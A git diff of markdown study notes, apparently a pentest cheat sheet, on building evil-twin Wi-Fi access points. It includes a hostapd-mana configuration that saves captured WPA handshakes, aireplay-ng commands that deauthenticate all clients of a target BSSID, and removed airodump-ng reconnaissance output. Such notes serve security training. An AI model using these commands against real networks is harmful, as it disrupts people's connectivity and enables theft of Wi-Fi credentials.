@@ -11,7 +11,7 @@ show_image_post: false                                    # Change this to true
 
 A rogue AP is an AP in use that has not been authorized by a local network administrator. This could take the form of an AP plugged into a network without the administrator's knowledge.
 
-### Creating a Rogue AP
+## Creating a Rogue AP
 Evil twins can be in any channel, except if we clone the BSSID of the AP we want to impersonate, in which case the channel must be different. But APs with different BSSID and equal ESSID can coexist in the same channel.
 
 If we get a connection in an evil twin, the connected client won't have internet access if we don't give him an IP with a dhcp server.
@@ -22,39 +22,6 @@ If we get a connection in an evil twin, the connected client won't have internet
 Deauth a client if he doesn't connect to our AP
 ``sudo aireplay-ng --deauth 4 -a <bssid> -c <client_MAC> wlan0mon``
 
-### Gathering Information
-While some clients will connect to our rogue AP just based on the SSID being the same as the target, our attack is more likely to succeed if we match the encryption details as well. To accomplish this, we need to conduct reconnaissance against the target to gather information.
-```bash
-airodump-ng -w discovery --output-format pcap wlan0
- BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
- 10:A7:93:BE:F0:B0  -47        2        0    0  11  195   WPA2 CCMP   PSK  SHUC-IRAN
-
-  BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                              
- (not associated)   8C:68:3A:9C:45:D8  -59    0 - 1      0        1          ShuciNetwork        
-```
-We will target the AP with the SSID "SHUC-IRAN". The airodump-ng output shows us SHUC-IRAN with the following details:
-
-| Feature | Value |
-|---------|-------|
-| Encryption | WPA2-PSK + CCMP |
-| Throughput | 195 Mbit |
-| Channel | 11 |
-
-When we create our rogue AP, we should match these settings as closely as possible to ensure that clients automatically connect to our rogue AP based on their Preferred Network List.
-
-We shouldn't solely trust the output of airodump-ng since it only shows the highest encryption possible. If the `SHUC-IRAN` target network also supports WPA1, that information will not be displayed in the table.
-
-To check for further information we need to analyze the previously generated traffic `discovery-01.pcap` with wireshark:
-```bash
-# Wireshark reading pcap
-wireshark -r discovery-01.pcap
-# Filter
-wlan.fc.subtype == 0x08 && wlan.ssid == "SHUC-IRAN"
-```
-
-Additionally if we look closely, we can see that there is a client trying to connect to an SSID called `ShuciNetwork` we could also create our rogue AP based on the client probes which we can retrieve from PCAP file using `wlan.fc.subtype == 0x08 && wlan.bssid contains 10:A7:93:BE:F0:B0`
-
-
 ### hostapd / hostapd-mana
 hostapd-mana is an enhanced version of hostapd. Both are used for hosting fake APs, but mana includes more options to do things like dump passwords obtained from the handshake. Hostapd-mana can read hostapd config files, but also includes other options 
 
@@ -64,34 +31,61 @@ sudo apt install hostapd-mana
 sudo apt install hostapd-mana
 ```
 
-Run
+Simple hostapd-mana configuration file called `a.conf`
+```bash
+interface=wlan0
+ssid=Mostar
+channel=1
+```
+
+Run hostapd
 ```bash
 hostapd a.conf
 hostapd-mana a.conf
 ```
 
-Parameters: 
-- ``driver=nl80211``  -> always the same for all linux devices
-- ``hw_mode=g`` -> 2.4 GHz  y 54 Mb
+WPA/WPA2 configuration file: 
+
+```bash
+# Interface
+interface=wlan0
+# SSID
+ssid=Mostar
+# Channel  
+channel=1
+# Value "g" for 2.4GHz and value "n" for 5GHz
+hw_mode=g 
+# This value is needed to comply with 802.11n (Wi-Fi New Generation [Better transmission]) 
+ieee80211n=1 
+# always the same for all linux devices
+driver=nl80211  
+# Value 3 enable both WPA and WPA2. Value 2 enable WPA2. Value 1 enable WPA.
+wpa=3 
+# To enable WPA-PSK
+wpa_key_mgmt=WPA-PSK 
+# Random value, irrelevant for this purpose, but needed.
+wpa_passphrase=ANYPASSWORD 
+# Enable TKIP/CCMP encryption with WPA. (Only use this or rsn_pairwise)
+wpa_pairwise=TKIP CCMP 
+# Enable TKIP/CCMP encryption with WPA2. (Only use this or wpa_pairwise)
+rsn_pairwise=TKIP CCMP 
+# File where WPA hashes will be saved
+mana_wpaout=/home/kali/mostar.hccapx 
+
 - auth_algs (this is for WEP, for WPA use the equivalent ``wpa`` parameter-> 
 	- ``auth_algs=0`` ->OPEN
 	- ``auth_algs=1`` ->WEP
 	- ``auth_algs=2`` -> Both
 - ``wep_key0`` <- we can use up to 4
-- Type of security
-	- ``wpa=3`` -> activate both WPA and WPA2
-	- ``wpa=2`` -> activate only WPA2
-	- ``wpa=1`` -> activate only WPA
+```
+To deauthenticate clients, we first connect a new wireless card and start monitor mode on channel 1 by using airmon-ng. The channel should be set to "1" to match that of our target AP. This is all accomplished by running sudo airmon-ng start wlan1 1. Next, we can use aireplay-ng to run a deauthentication attack (-0), continuously (0), against all clients connected to our target AP (-a FC:7A:2B:88:63:EF).
 
-Type of authentication:
-- ``wpa_key_mgmt=WPA-PSK``
-- ``wpa_passphrase=<passphrase>`` -> passphrase in the case of PSK auth, we can set anything here, we don't care it's wrong
-
-Encryption type (if the target is exclusiveliy WPA1 or WPA2 use just one of the following):
-- ``wpa_pairwise=TKIP CCMP`` -> TKIP or CCMP encryption with WAP1
-- ``rsn_pairwise=TKIP CCMP`` -> TKIP or CCMP encryption with WPA2
-
-- ``mana_wpaout``-> where to save the captured handshakes (in a Hashcat hccapx format). 
+```bash
+### This channel needa to be the exact same of the SSID where deauth will be executed
+sudo airmon-ng start wlan1 1
+### Use the BSSID to deauthenticate
+sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1
+```
 
 #### hostap with  no encryption
 ```
